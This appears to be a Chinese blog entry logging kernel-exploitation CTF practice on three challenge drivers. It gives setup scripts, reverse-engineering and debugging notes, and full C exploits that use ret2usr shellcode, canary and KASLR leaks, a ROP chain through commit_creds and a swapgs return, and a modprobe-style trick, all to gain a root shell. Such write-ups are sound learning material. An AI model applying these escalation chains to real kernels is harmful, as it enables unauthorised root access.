[
  
  {
    "title": "Kernel Pwn 刷题记录",
    "url": "/posts/Kernel-Pwn-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/",
    "categories": "",
    "tags": "",
    "date": "2025-02-26 00:00:00 +0800",
    





    
    "snippet": "‍添加到启动脚本if [ ! -d \"./rootfs/\" ];then    mkdir ./rootfs/    pushd rootfs    cpio -idmv &lt; ../rootfs.cpio    popdfiif [ ! -d \"./exp/\" ];then    mkdir ./exp/    pushd exp    cp /opt/kernel_exp/* .  ...",
    "content": "‍添加到启动脚本if [ ! -d \"./rootfs/\" ];then    mkdir ./rootfs/    pushd rootfs    cpio -idmv &lt; ../rootfs.cpio    popdfiif [ ! -d \"./exp/\" ];then    mkdir ./exp/    pushd exp    cp /opt/kernel_exp/* .    popdfipushd expmakecp exploit ../rootfs/popdpushd rootfsfind ./* | cpio -H newc -o &gt; ../rootfs.cpiopopd‍attach‍pythonimport osendfile ./vmlinuxtarget remote :1234pythonimport gdb#inferior = gdb.inferiors()[0]## (&lt;gdb.Inferior num=1, pid=1&gt;,)#field = gdb.parse_and_eval('*(struct module)0').tyep.fields()#print('--',field,'---')breakpoint = '''#b *__x64_sys_flitbipco'''gdb.execute(breakpoint)end‍‍NFS_KUAF‍  第四届“长城杯”网络安全大赛 暨京津冀网络安全技能竞赛（决赛）‍附件‍​​‍‍保护及init分析‍  启动保护qemu-system-x86_64 \\    -m 256M \\    -kernel bzImage \\    -initrd rootfs.cpio \\    -monitor /dev/null \\    -append \"root=/dev/ram console=ttyS0 loglevel=8 earlyprintk=serial,ttyS0,115200 nokaslr pti=off\" \\    -cpu kvm64,-smep,-smap \\    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\    -nographic \\    -s \\    -no-reboot      nokaslr 关闭了kernel地址随机化，在未开启KASLR保护机制时，内核代码段的基址为 0xffffffff81000000​ ，direct mapping area 的基址为 0xffff888000000000​        smep 和 smap 通常是一起出现的，这里是个减号，所以 保护是关闭的，也就意味着 内核态可以直接跳到用户空间代码段执行​  ‍  init 文件‍#!/bin/shmkdir /tmpmkdir /procmkdir /sysmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t devtmpfs devtmpfs /devmount -t tmpfs none /tmpmdev -secho -e \"Boot took $(cut -d' ' -f1 /proc/uptime) seconds\"insmod /lib/modules/5.4.0-100-generic/kernel/test.ko # 应该就是存在漏洞的驱动了chmod 666 /dev/uaf_device # 漏洞驱动setsid /bin/cttyhack setuidgid 1000 /bin/shpoweroff -d 0  -f‍提取 vmlinux  用于调试 kernel​​‍‍分析.ko 文件‍.ko 文件被去符号表了，可以通过 fops 结构体去恢复  ida 恢复 fops 脚本struct_name ='''owner llseek read write read_iter write_iter iopoll iterateiterate_shared poll unlocked_ioctl compat_ioctl mmap mmap_supported_flagsopen flush release fsync fasync lock sendpage get_unmapped_area check_flagsflock splice_write splice_read setlease fallocate show_fdinfo copy_file_rangeremap_file_range fadvise'''.split(' ')fops_address = 0x560ida_name.set_name(fops_address, 'fops')for offset in range(0, len(struct_name)):    next_ptr = ida_bytes.get_qword(fops_address + offset * 8)    if(next_ptr):        sname = 'device_' + struct_name[offset]        ida_name.set_name(next_ptr, sname)        print(hex(next_ptr),' --&gt; ',sname)‍  恢复前​​‍  恢复后​​‍‍  操作分析​​​​‍‍整体思路‍传入一个地址，然后执行，也是比较简单保护比较低，直接跳到用户态的执行shellcode‍‍exploit  exp.c#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include \"minilib.h\"char flag[0x50] = {0};size_t kernel_base          = 0xffffffff81000000;size_t commit_creds         = 0xffffffff810c5010;size_t prepare_kernel_cred  = 0xffffffff810c5270;size_t user_cs, user_ss, user_rflags, user_sp;void save_status(){    asm volatile (        \"mov user_cs, cs;\"        \"mov user_ss, ss;\"        \"mov user_sp, rsp;\"        \"pushf;\"        \"pop user_rflags;\"    );    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");}static void get_root_shell(){    int uid = getuid();    hex(uid);    char *argv[] = {\"/bin/sh\", \"-c\", \"/bin/sh\", NULL};    execve(\"/bin/sh\", argv, 0);    //chmod(\"/flag\",0777);    syscall64(60,0);}static size_t shell_addr = &amp;get_root_shell + 4;static void shellcode(){    asm volatile (        \"xor rdi, rdi;\"        \"mov rcx, prepare_kernel_cred;\"        \"call rcx;\"        \"mov rcx, commit_creds;\"        \"call rcx;\"        // swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp    );    // restore_flags    asm volatile (        \"nop;\"        \"nop;\"        \"push user_ss;\"        \"push user_sp;\"        \"push user_rflags;\"        \"push user_cs;\"        \"push shell_addr;\"        \"swapgs;\"        \"iretq;\"    );}size_t sc_addr = &amp;shellcode + 8;void doMain(){    save_status();    //bind_core(0);      char procn[0x30] = \"/dev/uaf_device\";    int fd1 = open(procn,2);    char buf[0x10];    write(fd1, &amp;sc_addr,8);    read(fd1, &amp;buf, 8);}extern void _start(){    doMain();    syscall64(60,0);}‍  Makefile‍CC = gccCFLAGS = -nostdlib -fpie -static -ffreestanding -std=c++2a -mno-sse -mno-mmx -mno-avx -masm=intelexploit: exp.c\t$(CC) $(CFLAGS) $&lt; -o $@  minilib.h#define O_RDONLY    0   /* Open read-only.  */#define O_WRONLY    1   /* Open write-only.  */#define O_RDWR      2   /* Open read/write.  */#define O_CREAT     0x40/* New File. */// bind_core#define MAX_CPUS 1024typedef struct { unsigned long bits[MAX_CPUS / (8 * sizeof(unsigned long))]; } cpu_set_t;static void CPU_ZERO(cpu_set_t *set) { for (int i = 0; i &lt; MAX_CPUS / (8 * sizeof(unsigned long)); i++) { set-&gt;bits[i] = 0; } }static void CPU_SET(int core, cpu_set_t *set) {    int idx = core / (8 * sizeof(unsigned long));    int offset = core % (8 * sizeof(unsigned long));    set-&gt;bits[idx] |= (1UL &lt;&lt; offset);}int syscall64(){    asm volatile (        \"mov rax, rdi;\"        \"mov rdi, rsi;\"        \"mov rsi, rdx;\"        \"mov rdx, rcx;\"        \"mov r10, r8 ;\"        \"mov r8 , r9 ;\"        \"mov r9 , [rsp + 8];\"        \"syscall;\"    );}int open(char *file,int prot){    return syscall64(2, file, prot);}int read(int fd, char *buf, int length){    return syscall64(0, fd, buf, length);}int write(int fd, char *buf, int length){    return syscall64(1, fd, buf, length);}int ioctl(int fd, size_t cmd, char *buf){    return syscall64(0x10, fd, cmd, buf);}void execve(char *cmd, size_t* args, char *environ){    syscall64(0x3b, cmd, args, environ);}int sendfile(size_t dst_fd, size_t src_fd, size_t offset, size_t count){    syscall64(0x28, dst_fd, src_fd, offset, count);}int chmod(char *filepath,int mode){    return syscall64(0x5a, filepath, mode, 0);}static size_t getuid(){return syscall64(0x66, 0, 0, 0);}static size_t getpid(){return syscall64(0x27, 0, 0, 0);}static int sched_setaffinity(size_t pid, size_t cpusetsize, const cpu_set_t *cupset){    return syscall64(0xcb, pid, cpusetsize, cupset);}static void bind_core(int core){    cpu_set_t cpu_set;    CPU_ZERO(&amp;cpu_set);    CPU_SET(core, &amp;cpu_set);    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);}void puts(char * Str){    int length=0;    while(Str[length]!=0){++length;}    write(1,Str,length);    write(1,\"\\n\",1);}void hex(size_t IntHex){    char buf[0x20]={0};    size_t idx = 0x18;    while (idx &gt; 1) {        buf[idx] = \"0123456789ABCDEF\"[IntHex &amp; 0xF];        IntHex &gt;&gt;= 4;        if(IntHex==0){            buf[idx-2]='0';            buf[idx-1]='x';            break;        }        idx--;    }    puts(&amp;buf[idx]-2);}void strncpy(char dst[], char src[], size_t n){    size_t i;    for(i = 0; i &lt; n ; i++){        dst[i] = src[i];    }    dst[i] = '\\x00';}‍问题及感想  返回用户态然后准备执行 execve /bin/sh, 发现 execve(\"/bin/sh\",0,0);​ 竟然不行.// 我不行，因为没参数？execve(\"/bin/sh\", 0, 0);// 加了 argv 就正常了操char *argv[] = {\"/bin/sh\", \"-c\", \"/bin/sh\", NULL};execve(\"/bin/sh\", argv, 0);​​‍‍‍Kylin_Overflow‍附件‍​​‍保护及init‍  ​kaslr​ 开启了地址随机化  ​+smep,+smap​ 隔离了 用户段和kernel 段qemu-system-x86_64 \\    -m 256M \\    -kernel bzImage \\    -initrd rootfs.cpio \\    -monitor /dev/null \\    -append \"root=/dev/ram console=ttyS0 loglevel=8 ttyS0,115200 kaslr\" \\    -cpu kvm64,+smep,+smap \\    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\    -nographic \\    -no-reboot \\    -s  init#!/bin/shmkdir /tmpmkdir /procmkdir /sysmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t devtmpfs devtmpfs /devmount -t tmpfs none /tmpmdev -secho -e \"Boot took $(cut -d' ' -f1 /proc/uptime) seconds\"# 存在漏洞的驱动文件insmod /lib/modules/5.10.0-9-generic/kernel/test.kochmod 666 /dev/test#setsid /bin/cttyhack setuidgid 1000 /bin/shsetsid /bin/cttyhack setuidgid 0 /bin/shpoweroff -d 0  -f‍分析 .ko 驱动  主要 用 ioctl 交互​​  栈溢出漏洞​​‍  一个 gadget‍​​‍整体思路‍  不知大这里给控制cr4寄存器有什么用‍‍先泄露 kernel 地址，然后 利用 stack 溢出‍然后我注意到 gadget​ 处的 mov cr4,rdi;retn​  后面搜了搜 cr4 寄存器的作用  cr4 寄存器结构​​‍  smep是由CR4寄存器来决定是否开启的, 在kernel中由CR4寄存器的第20位设置是否开启​​&gt;&gt;&gt; bin(0x3006f0)'0b1100000000011011110000'# 第20位也就是0x100000&gt;&gt;&gt; hex(0x3006f0-0x100000)'0x2006f0'# cr4 = # 0x3006f0 -&gt; 0x6f0# 即可关闭 smep 保护  猜测后高位的 这俩 1 分别是 +smep​ 和 +smap​ 保护 ，直接把他们都清空应该就算关闭保护了​‍  然后….., 先记住吧，但是给了这个 gadget 感觉 应该可以直接改吧​​‍‍  然后也是简单的试了一下改 cr4 寄存器， 然后就 crush​​‍#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include \"minilib.h\"char flag[0x50] = {0};size_t nokaslr_kernel_base          = 0xffffffff81000000;size_t commit_creds         = 0xffffffff810c5010;size_t prepare_kernel_cred  = 0xffffffff810c5270;size_t user_cs, user_ss, user_rflags, user_sp;void save_status(){    asm volatile (        \"mov user_cs, cs;\"        \"mov user_ss, ss;\"        \"mov user_sp, rsp;\"        \"pushf;\"        \"pop user_rflags;\"    );    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");}static void get_root_shell(){    int uid = getuid();    hex(uid);    char *argv[] = {\"/bin/sh\", \"-c\", \"/bin/sh\", NULL};    execve(\"/bin/sh\", argv, 0);    //chmod(\"/flag\",0777);    syscall64(60,0);}static size_t shell_addr = &amp;get_root_shell + 4;static void shellcode(){    asm volatile (        \"xor rdi, rdi;\"        \"mov rcx, prepare_kernel_cred;\"        \"call rcx;\"        \"mov rcx, commit_creds;\"        \"call rcx;\"        // swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp    );    // restore_flags    asm volatile (        \"nop;\"        \"nop;\"        \"push user_ss;\"        \"push user_sp;\"        \"push user_rflags;\"        \"push user_cs;\"        \"push shell_addr;\"        \"swapgs;\"        \"iretq;\"    );}size_t sc_addr = &amp;shellcode + 8;encrypt_cu(unsigned char *ptext,size_t length){    for (int i = 0;i&lt;length; ++i){        ptext[i] = ((ptext[i] &gt;&gt; 5) | (8 * ptext[i])) &amp; 0xFF;        ptext[i] = ~ptext[i];        ptext[i] ^= 0xF8;        ptext[i] += 5;    }}decrypt_cu(unsigned char *ptext,size_t length){    for (int i = 0;i&lt;length; ++i){        ptext[i] -= 5;        ptext[i] ^= 0xF8;        ptext[i] = ~ptext[i];        ptext[i] = ((0x20 * ptext[i]) | (ptext[i] &gt;&gt; 3)) &amp; 0xFF;    }}void doMain(){    save_status();    char procn[0x30] = \"/dev/test\";    int fd = open(procn,2);    size_t *data = malloc(0);    memset(data, 0, 0x1000);    strcat(data, \"NdbTh3Vzwu3aFK4PN9B5Fu9fjauaER74\\x00\");    //strcat(data, \"ABCD\");    encrypt_cu(data, 0x20);    size_t edit = 0xFEEDFACE;    size_t show = 0xDEADBEEF;    size_t gift = 0xCAFEBABE;    ioctl(fd, show, data);      decrypt_cu(&amp;data[4],0x100);    hexdump(&amp;data[0], 0x100);    ////size_t kernel_ko_addr = byte_to_long(&amp;data[0x20],8);    ////size_t kernel_base = byte_to_long(&amp;data[0x60],8) - 0x271105;    size_t kernel_ko_addr = data[4] - 0x43;    size_t kernel_base = data[12] - 0x271105;    size_t canary = data[5];    printf(\"kernel_ko_addr  = \");    hex(kernel_ko_addr);    printf(\"kernel_base     = \");    hex(kernel_base);    printf(\"stack_canary    = \");    hex(canary);    prepare_kernel_cred  = kernel_base + 0xcfbe0;    commit_creds         = kernel_base + 0xcf720;    memset(data, 0, 0x300);    strcat(data, \"NdbTh3Vzwu3aFK4PN9B5Fu9fjauaER74\\x00\");    repeat(&amp;data[4],'A',0x100);    int i = 0x24;    size_t pop_rdi = 0xffffffff81090c80 - nokaslr_kernel_base + kernel_base; // pop rdi; ret;    size_t mov_cr4_rdi = kernel_ko_addr + 0x050;    data[i++] = canary;    data[i++] = 0;    data[i++] = pop_rdi;    data[i++] = 0x6f0;    data[i++] = mov_cr4_rdi;    data[i++] = sc_addr; // crush 了    encrypt_cu(data, 0x200);    ioctl(fd, edit, data);    ioctl(fd, gift, data);}extern void _start(){    doMain();    syscall64(60,0);}  参考链接https://www.anquanke.com/post/id/244966‍‍‍  上面的的方法明显不行，就 正常 ROP 吧‍‍exploit‍      最终成功提权的exp        exp.c  #include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include \"minilib.h\"char flag[0x50] = {0};size_t nokaslr_kernel_base          = 0xffffffff81000000;size_t commit_creds         = 0xffffffff810c5010;size_t prepare_kernel_cred  = 0xffffffff810c5270;size_t user_cs, user_ss, user_rflags, user_sp;void save_status(){    asm volatile (        \"mov user_cs, cs;\"        \"mov user_ss, ss;\"        \"mov user_sp, rsp;\"        \"pushf;\"        \"pop user_rflags;\"    );    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");}static void get_root_shell(){    int uid = getuid();    hex(uid);    char *argv[] = {\"/bin/sh\", \"-c\", \"/bin/sh\", NULL};    execve(\"/bin/sh\", argv, 0);    //chmod(\"/flag\",0777);    syscall64(60,0);}static size_t shell_addr = &amp;get_root_shell;static void shellcode(){    asm volatile (        \"xor rdi, rdi;\"        \"mov rcx, prepare_kernel_cred;\"        \"call rcx;\"        \"mov rcx, commit_creds;\"        \"call rcx;\"        // swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp    );    // restore_flags    asm volatile (        \"nop;\"        \"nop;\"        \"push user_ss;\"        \"push user_sp;\"        \"push user_rflags;\"        \"push user_cs;\"        \"push shell_addr;\"        \"swapgs;\"        \"iretq;\"    );}size_t sc_addr = &amp;shellcode + 8;encrypt_cu(unsigned char *ptext,size_t length){    for (int i = 0;i&lt;length; ++i){        ptext[i] = ((ptext[i] &gt;&gt; 5) | (8 * ptext[i])) &amp; 0xFF;        ptext[i] = ~ptext[i];        ptext[i] ^= 0xF8;        ptext[i] += 5;    }}decrypt_cu(unsigned char *ptext,size_t length){    for (int i = 0;i&lt;length; ++i){        ptext[i] -= 5;        ptext[i] ^= 0xF8;        ptext[i] = ~ptext[i];        ptext[i] = ((0x20 * ptext[i]) | (ptext[i] &gt;&gt; 3)) &amp; 0xFF;    }}void doMain(){    save_status();    char procn[0x30] = \"/dev/test\";    int fd = open(procn,2);    size_t *data = malloc(0);    memset(data, 0, 0x1000);    strcat(data, \"NdbTh3Vzwu3aFK4PN9B5Fu9fjauaER74\\x00\");    //strcat(data, \"ABCD\");    encrypt_cu(data, 0x20);    size_t edit = 0xFEEDFACE;    size_t show = 0xDEADBEEF;    size_t gift = 0xCAFEBABE;    ioctl(fd, show, data);      decrypt_cu(&amp;data[4],0x100);    hexdump(&amp;data[0], 0x100);    ////size_t kernel_ko_addr = byte_to_long(&amp;data[0x20],8);    ////size_t kernel_base = byte_to_long(&amp;data[0x60],8) - 0x271105;    size_t kernel_ko_addr = data[4] - 0x43;    size_t kernel_base = data[12] - 0x271105;    size_t canary = data[5];    printf(\"kernel_ko_addr  = \");    hex(kernel_ko_addr);    printf(\"kernel_base     = \");    hex(kernel_base);    printf(\"stack_canary    = \");    hex(canary);    prepare_kernel_cred  = kernel_base + 0xcfbe0;    commit_creds         = kernel_base + 0xcf720;    memset(data, 0, 0x300);    strcat(data, \"NdbTh3Vzwu3aFK4PN9B5Fu9fjauaER74\\x00\");    repeat(&amp;data[4],'A',0x100);    int i = 0x24;    size_t pop_rdi = 0xffffffff81090c80 - nokaslr_kernel_base + kernel_base; // pop rdi; ret;    size_t mov_rdi_rax = kernel_ko_addr + 0x04C;    size_t mov_cr4_rdi = kernel_ko_addr + 0x050;    size_t swapgs = kernel_ko_addr + 0x54;    size_t iretq  = kernel_ko_addr + 0x58; //iretq; ret    size_t swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xc00ff0 + 54;    data[i++] = canary;    data[i++] = 0;    //data[i++] = pop_rdi;     //data[i++] = 0x6f0;    //data[i++] = mov_cr4_rdi;    data[i++] = pop_rdi;    data[i++] = 0;    data[i++] = prepare_kernel_cred;    data[i++] = mov_rdi_rax;    data[i++] = commit_creds;    data[i++] = swapgs_restore_regs_and_return_to_usermode;    //data[i++] = swapgs;    //data[i++] = iretq;    data[i++] = 0;    data[i++] = 0;    data[i++] = shell_addr;    data[i++] = user_cs;    data[i++] = user_rflags;    data[i++] = user_sp;    data[i++] = user_ss;    encrypt_cu(data, 0x300);    ioctl(fd, edit, data);    ioctl(fd, gift, data);}extern void _start(){    doMain();    syscall64(60,0);}‍‍‍‍‍‍问题及感想1  ​vmlinux-to-elf​ 获取 kernel elf 后，用 checksec 检测保护, PIE 是关闭的​​‍  但是呢， qemu-system-x86_64​ 启动时 时开启 地址随机化的‍​​‍  然后后面调试的时候就很怪,没有符号表​​‍  网上搜了一下，发现可以在 target​ 前使使用 add-symbol-file​ 重新定位地址​​  然后符号表就有了​​  但还是有点小问题比如…直接 tel 看 地址还是 noPIE 的地址，然后就很玄学​​​​‍‍‍#add-symbol-file ./vmlinux &lt;新基地址&gt;cat /proc/kallsyms | grep startup_64add-symbol-file ./vmlinux set $base=0x-0xffffffff81000000​​‍问题及感想2 （调试调废了，这个问题未完成，待续）问题出在这里， 用这种方式返回也会态后，无法执行执行代码，会直接 gg‍  rop 是这样的data[i++] = canary;data[i++] = 0;data[i++] = pop_rdi;data[i++] = 0;data[i++] = prepare_kernel_cred;data[i++] = mov_rdi_rax;data[i++] = commit_creds;data[i++] = swapgs;\t// swapgs; retndata[i++] = iretq;\t// iretq; retndata[i++] = shell_addr;data[i++] = user_cs;data[i++] = user_rflags;data[i++] = user_sp;data[i++] = user_ss;  对照一下 shellcodeasm volatile (    \"push user_ss;\"    \"push user_sp;\"    \"push user_rflags;\"    \"push user_cs;\"    \"push shell_addr;\"    \"swapgs;\"    \"iretq;\");  然后动态调试一下‍‍​​​​​​  然后再单步走，就直接gg了, 段错误,​​​​‍[   48.590572][  T134] exploit[134]: segfault at 401635 ip 0000000000401635 sp 00007ffd8490f528 error 15 in exploit[401000+1000][   48.596286][  T134] Code: 00 8c 14 25 28 40 40 00 48 89 24 25 38 40 40 00 9c 8f 04 25 30 40 40 00 48 8d 05 fe 09 00 00 48 89‍  通过上面的段错误 我感觉可能是 +smep,+smap​ 保护的原因吧  下面就调试一下正常情况下，kernel 态 到用户态的过程‍swapgs_restore_regs_and_return_to_usermode  swapgs_restore_regs_and_return_to_usermode 汇编代码pwndbg&gt; x/54i 0xffffffffa2c00000 + 0xc00ff0   0xffffffffa3800ff0 &lt;swapgs_restore_regs_and_return_to_usermode&gt;:     jmp    0xffffffffa380100b &lt;swapgs_restore_regs_and_return_to_usermode+27&gt;   0xffffffffa3800ff2 &lt;swapgs_restore_regs_and_return_to_usermode+2&gt;:   mov    ecx,0x48   0xffffffffa3800ff7 &lt;swapgs_restore_regs_and_return_to_usermode+7&gt;:   mov    rdx,QWORD PTR gs:0x17bc8   0xffffffffa3801000 &lt;swapgs_restore_regs_and_return_to_usermode+16&gt;:  and    edx,0xfffffffe   0xffffffffa3801003 &lt;swapgs_restore_regs_and_return_to_usermode+19&gt;:  mov    eax,edx   0xffffffffa3801005 &lt;swapgs_restore_regs_and_return_to_usermode+21&gt;:  shr    rdx,0x20   0xffffffffa3801009 &lt;swapgs_restore_regs_and_return_to_usermode+25&gt;:  wrmsr   0xffffffffa380100b &lt;swapgs_restore_regs_and_return_to_usermode+27&gt;:  nop    DWORD PTR [rax+rax*1+0x0]    0xffffffffa3801010 &lt;swapgs_restore_regs_and_return_to_usermode+32&gt;:  pop    r15\t; 恢复用户态的寄存器?   0xffffffffa3801012 &lt;swapgs_restore_regs_and_return_to_usermode+34&gt;:  pop    r14   0xffffffffa3801014 &lt;swapgs_restore_regs_and_return_to_usermode+36&gt;:  pop    r13   0xffffffffa3801016 &lt;swapgs_restore_regs_and_return_to_usermode+38&gt;:  pop    r12   0xffffffffa3801018 &lt;swapgs_restore_regs_and_return_to_usermode+40&gt;:  pop    rbp   0xffffffffa3801019 &lt;swapgs_restore_regs_and_return_to_usermode+41&gt;:  pop    rbx   0xffffffffa380101a &lt;swapgs_restore_regs_and_return_to_usermode+42&gt;:  pop    r11   0xffffffffa380101c &lt;swapgs_restore_regs_and_return_to_usermode+44&gt;:  pop    r10   0xffffffffa380101e &lt;swapgs_restore_regs_and_return_to_usermode+46&gt;:  pop    r9   0xffffffffa3801020 &lt;swapgs_restore_regs_and_return_to_usermode+48&gt;:  pop    r8   0xffffffffa3801022 &lt;swapgs_restore_regs_and_return_to_usermode+50&gt;:  pop    rax   0xffffffffa3801023 &lt;swapgs_restore_regs_and_return_to_usermode+51&gt;:  pop    rcx   0xffffffffa3801024 &lt;swapgs_restore_regs_and_return_to_usermode+52&gt;:  pop    rdx   0xffffffffa3801025 &lt;swapgs_restore_regs_and_return_to_usermode+53&gt;:  pop    rsi   0xffffffffa3801026 &lt;swapgs_restore_regs_and_return_to_usermode+54&gt;:  mov    rdi,rsp ; exp 是跳到这里然后执行的  ; rsp 赋值给 rdi   0xffffffffa3801029 &lt;swapgs_restore_regs_and_return_to_usermode+57&gt;:  mov    rsp,QWORD PTR gs:0x6004\t; 不知道   0xffffffffa3801032 &lt;swapgs_restore_regs_and_return_to_usermode+66&gt;:  push   QWORD PTR [rdi+0x30]\t\t; user status   0xffffffffa3801035 &lt;swapgs_restore_regs_and_return_to_usermode+69&gt;:  push   QWORD PTR [rdi+0x28]   0xffffffffa3801038 &lt;swapgs_restore_regs_and_return_to_usermode+72&gt;:  push   QWORD PTR [rdi+0x20]   0xffffffffa380103b &lt;swapgs_restore_regs_and_return_to_usermode+75&gt;:  push   QWORD PTR [rdi+0x18]   0xffffffffa380103e &lt;swapgs_restore_regs_and_return_to_usermode+78&gt;:  push   QWORD PTR [rdi+0x10]   0xffffffffa3801041 &lt;swapgs_restore_regs_and_return_to_usermode+81&gt;:  push   QWORD PTR [rdi]   0xffffffffa3801043 &lt;swapgs_restore_regs_and_return_to_usermode+83&gt;:  push   rax   0xffffffffa3801044 &lt;swapgs_restore_regs_and_return_to_usermode+84&gt;:  xchg   ax,ax   0xffffffffa3801046 &lt;swapgs_restore_regs_and_return_to_usermode+86&gt;:  mov    rdi,cr3\t; 这里 取出 cr3   0xffffffffa3801049 &lt;swapgs_restore_regs_and_return_to_usermode+89&gt;:  jmp    0xffffffffa380107f &lt;swapgs_restore_regs_and_return_to_usermode+143&gt;   0xffffffffa380104b &lt;swapgs_restore_regs_and_return_to_usermode+91&gt;:  mov    rax,rdi   0xffffffffa380104e &lt;swapgs_restore_regs_and_return_to_usermode+94&gt;:  and    rdi,0x7ff   0xffffffffa3801055 &lt;swapgs_restore_regs_and_return_to_usermode+101&gt;: bt     QWORD PTR gs:0x2b756,rdi   0xffffffffa380105f &lt;swapgs_restore_regs_and_return_to_usermode+111&gt;: jae    0xffffffffa3801070 &lt;swapgs_restore_regs_and_return_to_usermode+128&gt;   0xffffffffa3801061 &lt;swapgs_restore_regs_and_return_to_usermode+113&gt;: btr    QWORD PTR gs:0x2b756,rdi   0xffffffffa380106b &lt;swapgs_restore_regs_and_return_to_usermode+123&gt;: mov    rdi,rax   0xffffffffa380106e &lt;swapgs_restore_regs_and_return_to_usermode+126&gt;: jmp    0xffffffffa3801078 &lt;swapgs_restore_regs_and_return_to_usermode+136&gt;   0xffffffffa3801070 &lt;swapgs_restore_regs_and_return_to_usermode+128&gt;: mov    rdi,rax   0xffffffffa3801073 &lt;swapgs_restore_regs_and_return_to_usermode+131&gt;: bts    rdi,0x3f   0xffffffffa3801078 &lt;swapgs_restore_regs_and_return_to_usermode+136&gt;: or     rdi,0x800   0xffffffffa380107f &lt;swapgs_restore_regs_and_return_to_usermode+143&gt;: or     rdi,0x1000\t; 然后jmp 到这里了   0xffffffffa3801086 &lt;swapgs_restore_regs_and_return_to_usermode+150&gt;: mov    cr3,rdi   0xffffffffa3801089 &lt;swapgs_restore_regs_and_return_to_usermode+153&gt;: pop    rax   0xffffffffa380108a &lt;swapgs_restore_regs_and_return_to_usermode+154&gt;: pop    rdi   0xffffffffa380108b &lt;swapgs_restore_regs_and_return_to_usermode+155&gt;: swapgs   0xffffffffa380108e &lt;swapgs_restore_regs_and_return_to_usermode+158&gt;: jmp    0xffffffffa38010c0 &lt;native_iret&gt;   0xffffffffa3801093 &lt;swapgs_restore_regs_and_return_to_usermode+163&gt;: nop​​​​‍‍  exp‍​​‍​​‍​​‍​​‍‍  大概就是 修改里一个 cr3 寄存器的值，然后返回用户态0x3052000 -&gt; 0x3053000cr3 = cr3 | 0x1000 # = 0x3053000然后swapgsiretq‍  下面我尝试手动修改cr3 的值data[i++] = canary;data[i++] = 0;data[i++] = pop_rdi;data[i++] = 0;data[i++] = prepare_kernel_cred;data[i++] = mov_rdi_rax;data[i++] = commit_creds;data[i++] = swapgs;\t// swapgs; retndata[i++] = iretq;\t// iretq; retn 执行到这里时 gdb 手动修改 cr3寄存器的值为0x3053000，然后再继续返回到用户态，看看能不能正常执行data[i++] = shell_addr;data[i++] = user_cs;data[i++] = user_rflags;data[i++] = user_sp;data[i++] = user_ss;  执行到 swapgs 后,我们查看 cr3 寄存器的值，发现和上面的不一样，然后多试了几次，才知道 cr3 的值每次都是不一样的，但是 or 0x1000​ 操作应该是固定的吧，我们就手动计算修改试试看​​‍&gt;&gt;&gt; hex(0x307e000|0x1000)'0x307f000'      不能直接 set $cr3=0x307f000​ ,奇怪        但是这样就可以了哈哈， 然后就更奇怪了，修改后强行run 就 crush 了，  ​​‍‍‍‍‍Kylin_Driver‍保护及init  开启了 kaslr kerenl 地址随机化  然后是 +smep + smap​,​​‍  默认看不了地址​​‍‍分析 .ko 驱动‍  ioctl 功能点分析​​‍  给了几个 gadget​​‍  漏洞点, RAX 指针内容可以被覆盖，​​​​‍‍‍‍exploit(学了一个新方法)‍​​‍  直接 rop​​​​‍  ‍‍‍​​‍‍  exploit‍#include \"minilib.h\"char flag[0x50] = {0};size_t nokaslr_kernel_base  = 0xffffffff81000000;size_t commit_creds         = 0xffffffff810c5010;size_t prepare_kernel_cred  = 0xffffffff810c5270;size_t user_cs, user_ss, user_rflags, user_sp;void save_status(){    asm volatile (        \"mov user_cs, cs;\"        \"mov user_ss, ss;\"        \"mov user_sp, rsp;\"        \"pushf;\"        \"pop user_rflags;\"    );    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");}static void get_root_shell(){    int uid = getuid();    hex(uid);    system(\"/bin/sh\");    //chmod(\"/flag\",0777);    syscall64(60,0);}static size_t shell_addr = &amp;get_root_shell;static void shellcode(){    asm volatile (        \"xor rdi, rdi;\"        \"mov rcx, prepare_kernel_cred;\"        \"call rcx;\"        \"mov rcx, commit_creds;\"        \"call rcx;\"        // swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp    );    // restore_flags    asm volatile (        \"nop;\"        \"nop;\"        \"push user_ss;\"        \"push user_sp;\"        \"push user_rflags;\"        \"push user_cs;\"        \"push shell_addr;\"        \"swapgs;\"        \"iretq;\"    );}size_t sc_addr = &amp;shellcode + 8;void modprobe_rce(){    system(\"echo -ne '#!/bin/sh\\n/bin/chmod 777 /flag\\n' &gt; /tmp/e1\");    system(\"chmod +x /tmp/e1\");    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' &gt; /tmp/e2\");    system(\"chmod +x /tmp/e2\");    system(\"/tmp/e2\");      // sh: /tmp/e2: Permission denied    system(\"/tmp/e2\");      // ./tmp/e2: line 1: : not found    system(\"cat /flag\");    system(\"cat /flag\");}void doMain(){    save_status();    char procn[0x30] = \"/dev/test\";    int fd = open(procn,2);    uint8_t *ptr = malloc(0);    memset(ptr, 0 ,0x1000);    uint8_t pwd[] = \"gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc\\x00\";    int i = 0;    while (i&lt;0x20)        pwd[i++] ^= 0xF9;    strncpy(ptr, pwd, 0x20);    size_t show = 0xDEADBEEF;    size_t edit = 0xFEEDFACE;    ioctl(fd, show, ptr);    i = 0x20;    while (i&lt;0x230)        ptr[i++] ^= 0xF9;    hexdump(ptr, 0x230);    size_t *data = &amp;ptr[0x20];    size_t ko_base = data[0];    size_t kernel_base = data[8] - 0x336d60 - 102;    lss(\"ko_base\", ko_base);    lss(\"kernel_base\", kernel_base);    memset(ptr, 0 ,0x1000);    strncpy(ptr, pwd, 0x20);    size_t *ropchain = 